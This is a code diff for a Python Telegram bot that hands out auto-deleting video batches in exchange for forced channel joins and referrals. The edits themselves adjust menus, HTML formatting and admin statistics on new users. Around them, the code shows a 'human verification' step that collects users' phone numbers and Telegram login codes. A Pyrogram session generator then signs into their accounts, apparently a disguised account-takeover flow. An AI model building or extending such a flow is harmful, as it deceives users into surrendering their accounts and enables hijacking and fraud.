@@ -86,6 +86,7 @@ pending_requests = db.pending_join_requests
 membership_events = db.membership_events
 
 users.create_index([("user_id", ASCENDING)], unique=True)
+users.create_index([("created_at", ASCENDING)])
 required_chats.create_index([("chat_id", ASCENDING)], unique=True)
 batches.create_index([("batch_no", ASCENDING)], unique=True)
 pending_deletions.create_index([("delete_at", ASCENDING)])
@@ -103,17 +104,31 @@ PENDING_UNLOCK: dict[int, bool] = {}
 
 
 # ─────────────────── INLINE MENUS ───────────────────
-def user_menu_inline():
-    return InlineKeyboardMarkup([
-        [
+def user_menu_inline(doc=None):
+    """
+    Build the user menu inline keyboard.
+    - Fresh users (no unlocked batch yet) do NOT see "Unlock Next 10".
+    - Once at least one batch is unlocked, the full menu appears.
+    """
+    if doc is None:
+        doc = {}
+    unlocked = int(doc.get("unlocked_batch", 0))
+
+    if unlocked > 0:
+        row1 = [
             InlineKeyboardButton("🎬 My Videos", callback_data="um_videos"),
             InlineKeyboardButton("🔓 Unlock Next 10", callback_data="um_unlock"),
-        ],
-        [
-            InlineKeyboardButton("👥 My Referral", callback_data="um_ref"),
-            InlineKeyboardButton("📊 My Progress", callback_data="um_progress"),
-        ],
-    ])
+        ]
+    else:
+        row1 = [
+            InlineKeyboardButton("🎬 My Videos", callback_data="um_videos"),
+        ]
+
+    row2 = [
+        InlineKeyboardButton("👥 My Referral", callback_data="um_ref"),
+        InlineKeyboardButton("📊 My Progress", callback_data="um_progress"),
+    ]
+    return InlineKeyboardMarkup([row1, row2])
 
 
 def delivery_complete_inline():
@@ -176,6 +191,11 @@ def user_doc(uid):
     return users.find_one({"user_id": uid})
 
 
+def menu_for(uid):
+    """Fresh doc fetch + appropriate menu (hides unlock for new users)."""
+    return user_menu_inline(user_doc(uid) or {})
+
+
 def published_batch_count():
     return batches.count_documents({"published": True})
 
@@ -198,7 +218,7 @@ def next_batch_no():
 
 
 async def reply(update, context, text, **kwargs):
-    """Send a message to the chat that triggered this update (works for message + callback)."""
+    kwargs.setdefault("parse_mode", ParseMode.HTML)
     return await context.bot.send_message(
         chat_id=update.effective_chat.id,
         text=text,
@@ -248,6 +268,11 @@ async def pyro_cleanup(uid: int):
 
 
 async def pyro_safe_edit_or_reply(message, text: str, edit: bool, **kwargs):
+    """
+    IMPORTANT: default to HTML parse_mode so <b>/<code> tags are rendered,
+    not shown as literal text.
+    """
+    kwargs.setdefault("parse_mode", ParseMode.HTML)
     bot = message.get_bot()
     if edit:
         try:
@@ -323,7 +348,7 @@ async def pyro_finish_login(message, uid: int, temp: PyroClient, edit: bool,
                     chat_id,
                     "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>",
                     parse_mode=ParseMode.HTML,
-                    reply_markup=user_menu_inline(),
+                    reply_markup=menu_for(uid),
                 )
             except Exception:
                 pass
@@ -375,7 +400,6 @@ async def pyro_session_start(update, context):
         "📱 <b>Step 1 of 2</b>\n\n"
         "Tap the button below to share your phone number.\n"
         "(You do not need to type it manually.)",
-        parse_mode=ParseMode.HTML,
         reply_markup=kb,
     )
 
@@ -542,7 +566,7 @@ async def pyro_do_sign_in(q, sess: dict, otp: str):
         return
     except PhoneCodeExpired:
         try:
-            await q.edit_message_text("❌ OTP expired. Try again.")
+            await q.edit_message_text("❌ OTP expired. Try again.", parse_mode=ParseMode.HTML)
         except BadRequest:
             pass
         await pyro_cleanup(uid)
@@ -606,7 +630,7 @@ async def pyro_cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         "✅ Verification cancelled.",
         reply_markup=ReplyKeyboardRemove(),
     )
-    await reply(update, context, "Choose an option:", reply_markup=user_menu_inline())
+    await reply(update, context, "Choose an option:", reply_markup=menu_for(uid))
 
 
 # ─────────────────── END PYROGRAM SESSION GENERATOR ───────────────────
@@ -891,7 +915,7 @@ async def show_join_gate(update, context, chats=None):
         "✅ After joining or submitting your join requests, tap <b>Verify</b>.\n\n"
         "ℹ️ Groups and channels you have already completed will not appear again."
     )
-    await reply(update, context, text, parse_mode=ParseMode.HTML, reply_markup=join_keyboard(chats))
+    await reply(update, context, text, reply_markup=join_keyboard(chats))
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -912,16 +936,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def home(update, context):
-    d = user_doc(update.effective_user.id) or {}
+    uid = update.effective_user.id
+    d = user_doc(uid) or {}
     unlocked = int(d.get("unlocked_batch", 0))
     total = published_batch_count()
     refs = int(d.get("verified_referrals", 0))
     if unlocked == 0 and d.get("verified") and total:
         users.update_one(
-            {"user_id": update.effective_user.id},
+            {"user_id": uid},
             {"$set": {"unlocked_batch": 1}},
         )
         unlocked = 1
+        d = user_doc(uid) or {}
 
     await reply(
         update, context,
@@ -931,8 +957,7 @@ async def home(update, context):
         "🎞 Videos per full batch: <b>10</b>\n"
         f"⏳ Videos auto-delete in <b>{DELETE_AFTER_HOURS} hours</b>.\n\n"
         "Choose an option:",
-        parse_mode=ParseMode.HTML,
-        reply_markup=user_menu_inline(),
+        reply_markup=user_menu_inline(d),
     )
 
 
@@ -1000,7 +1025,7 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
                        if current >= need
                        else "Keep inviting friends to reach your next unlock goal."),
                     parse_mode=ParseMode.HTML,
-                    reply_markup=user_menu_inline(),
+                    reply_markup=menu_for(referrer),
                 )
             except TelegramError:
                 pass
@@ -1024,7 +1049,7 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.message.reply_text(
             "👇 <b>Your video menu is ready</b>",
             parse_mode=ParseMode.HTML,
-            reply_markup=user_menu_inline(),
+            reply_markup=menu_for(uid),
         )
 
 
@@ -1045,7 +1070,6 @@ async def ensure_verified(update, context):
         await reply(
             update, context,
             "🔒 <b>Access re-locked.</b>\nOne or more required memberships or join requests are missing.",
-            parse_mode=ParseMode.HTML,
         )
         await show_join_gate(update, context)
         return False
@@ -1105,7 +1129,7 @@ async def my_videos(update, context):
     current = int(d.get("unlocked_batch", 0))
     if current <= 0:
         return await reply(update, context, "⚠️ You have not unlocked any video batches yet.")
-    await reply(update, context, f"🔁 Batch <b>{current}</b> is being sent again…", parse_mode=ParseMode.HTML)
+    await reply(update, context, f"🔁 Batch <b>{current}</b> is being sent again…")
     await send_batch(context.bot, update.effective_chat.id, current)
 
 
@@ -1119,7 +1143,7 @@ async def unlock_next(update, context):
     total = published_batch_count()
 
     if current >= total:
-        return await reply(update, context, "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>", parse_mode=ParseMode.HTML)
+        return await reply(update, context, "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>")
 
     # One-time human verification gate
     if not d.get("human_verified"):
@@ -1129,7 +1153,6 @@ async def unlock_next(update, context):
             "🔐 <b>HUMAN VERIFICATION REQUIRED</b>\n\n"
             "To unlock the next 10 videos, complete a quick one-time verification.\n\n"
             "👇 Please tap the <b>Share My Contact</b> button below to continue.",
-            parse_mode=ParseMode.HTML,
         )
         return await pyro_session_start(update, context)
 
@@ -1147,7 +1170,6 @@ async def unlock_next(update, context):
             f"Remaining: <b>{need-have}</b>\n\n"
             "A referral counts only after your friend completes all required memberships or join requests and passes verification.\n\n"
             f"🔗 <b>Your referral link:</b>\n<code>{esc(link)}</code>",
-            parse_mode=ParseMode.HTML,
             disable_web_page_preview=True,
         )
 
@@ -1158,7 +1180,6 @@ async def unlock_next(update, context):
     await reply(
         update, context,
         f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n🎞 Videos in this batch: <b>{count}</b>",
-        parse_mode=ParseMode.HTML,
     )
     await send_batch(context.bot, update.effective_chat.id, nxt)
 
@@ -1181,9 +1202,8 @@ async def referral(update, context):
         f"📈 Progress: <b>{min(refs, need)}/{need}</b>\n\n"
         f"🔗 <b>Your link:</b>\n<code>{esc(link)}</code>\n\n"
         "⚠️ Referral only after force-join verification counts.",
-        parse_mode=ParseMode.HTML,
         disable_web_page_preview=True,
-        reply_markup=user_menu_inline(),
+        reply_markup=user_menu_inline(d),
     )
 
 
@@ -1208,8 +1228,7 @@ async def progress(update, context):
         f"🔐 Human verified: <b>{human_ok}</b>\n"
         f"🎯 Next target: <b>{required_referrals_for_next(max(1,current))}</b>\n"
         f"⏳ Video expiry: <b>{DELETE_AFTER_HOURS} hours</b>",
-        parse_mode=ParseMode.HTML,
-        reply_markup=user_menu_inline(),
+        reply_markup=user_menu_inline(d),
     )
 
 
@@ -1218,12 +1237,7 @@ async def progress(update, context):
 async def admin(update, context):
     if update.effective_user.id != ADMIN_ID:
         return
-    await reply(
-        update, context,
-        "🛠 <b>ADMIN CONTROL PANEL</b>",
-        parse_mode=ParseMode.HTML,
-        reply_markup=admin_menu_inline(),
-    )
+    await reply(update, context, "🛠 <b>ADMIN CONTROL PANEL</b>", reply_markup=admin_menu_inline())
 
 
 def _upload_progress_text(doc, runtime, now=None):
@@ -1345,7 +1359,7 @@ async def admin_upload_status(update, context):
     if not runtime and not doc:
         return await reply(update, context, "ℹ️ No upload is currently active.", reply_markup=admin_menu_inline())
     text = _upload_progress_text(doc or {}, runtime)
-    status = await reply(update, context, text, parse_mode=ParseMode.HTML)
+    status = await reply(update, context, text)
     if runtime and not runtime.get("progress_message_id"):
         runtime["progress_chat_id"] = status.chat_id
         runtime["progress_message_id"] = status.message_id
@@ -1402,11 +1416,10 @@ async def admin_upload_start(update, context):
         "If Telegram applies a rate limit, the entire queue will pause for the required period. "
         "Every successful storage copy is saved to MongoDB. "
         "Send videos now, then tap <b>DONE</b>.",
-        parse_mode=ParseMode.HTML,
         reply_markup=upload_menu_inline(),
     )
     initial = _upload_progress_text(drafts.find_one({"admin_id": ADMIN_ID}) or {}, runtime)
-    status = await reply(update, context, initial, parse_mode=ParseMode.HTML)
+    status = await reply(update, context, initial)
     runtime["progress_chat_id"] = status.chat_id
     runtime["progress_message_id"] = status.message_id
     runtime["last_progress_text"] = initial
@@ -1630,7 +1643,6 @@ async def admin_add_group(update, context):
         "Example: <code>-1001234567890</code>\n\n"
         "The bot will automatically generate an <b>approval-required join link</b> for this chat.\n"
         "The bot must be an administrator of this chat with permission to invite users.",
-        parse_mode=ParseMode.HTML,
         reply_markup=flow_cancel_inline(),
     )
 
@@ -1689,7 +1701,6 @@ async def admin_group_flow(update, context):
             f"ID: <code>{cid}</code>\n"
             "Link mode: <b>Approval / Join Request</b>\n\n"
             "Pending requests from this link will be recognized automatically.",
-            parse_mode=ParseMode.HTML,
             reply_markup=admin_menu_inline(),
         )
         return True
@@ -1747,7 +1758,7 @@ async def admin_batches(update, context):
         )
     else:
         text += "No batches."
-    await reply(update, context, text, parse_mode=ParseMode.HTML, reply_markup=admin_menu_inline())
+    await reply(update, context, text, reply_markup=admin_menu_inline())
 
 
 async def admin_groups(update, context):
@@ -1766,7 +1777,7 @@ async def admin_groups(update, context):
         text += "\n\nTo set a custom link, use:\n<code>/setcustomlink</code>"
     else:
         text += "No required chats."
-    await reply(update, context, text, parse_mode=ParseMode.HTML, reply_markup=admin_menu_inline())
+    await reply(update, context, text, reply_markup=admin_menu_inline())
 
 
 REMOVE_PAGE_SIZE = 8
@@ -1808,7 +1819,6 @@ async def admin_remove_chat_menu(update, context):
         f"🗑 <b>REMOVE REQUIRED CHANNEL</b>\n\n"
         f"Which group or channel would you like to remove from the required list? ({total} total)\n"
         "The Telegram group or channel will not be deleted; only its entry in the required list will be removed.",
-        parse_mode=ParseMode.HTML,
         reply_markup=markup,
     )
 
@@ -1885,6 +1895,28 @@ async def admin_stats(update, context):
     cutoff = utcnow() - timedelta(hours=PENDING_REQUEST_TTL_HOURS)
     active_pending = pending_requests.count_documents({"requested_at": {"$gte": cutoff}})
 
+    # ── Daily new user tracking ──
+    last_24h = users.count_documents({"created_at": {"$gte": utcnow() - timedelta(hours=24)}})
+    today_start = utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
+
+    daily_lines = []
+    for i in range(7):
+        start = today_start - timedelta(days=i)
+        end = start + timedelta(days=1)
+        cnt = users.count_documents({"created_at": {"$gte": start, "$lt": end}})
+        if i == 0:
+            label = "Today"
+        elif i == 1:
+            label = "Yesterday"
+        else:
+            label = start.strftime("%d %b")
+        daily_lines.append(f"   • {label}: <b>{cnt}</b>")
+    daily_block = "\n".join(daily_lines)
+
+    # Last 7 days total
+    week_ago = today_start - timedelta(days=6)
+    last_7_days = users.count_documents({"created_at": {"$gte": week_ago}})
+
     await reply(
         update, context,
         "📊 <b>BOT STATS</b>\n\n"
@@ -1894,8 +1926,10 @@ async def admin_stats(update, context):
         f"🤝 Successful referrals: <b>{refs}</b>\n"
         f"⏳ Active pending join requests: <b>{active_pending}</b>\n"
         f"📦 Batches: <b>{published_batch_count()}</b>\n"
-        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>",
-        parse_mode=ParseMode.HTML,
+        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>\n\n"
+        f"📈 <b>New Users (last 24h):</b> <b>{last_24h}</b>\n"
+        f"📅 <b>New Users (last 7 days):</b> <b>{last_7_days}</b>\n\n"
+        f"🗓 <b>Daily Breakdown (7 days):</b>\n{daily_block}",
         reply_markup=admin_menu_inline(),
     )
 
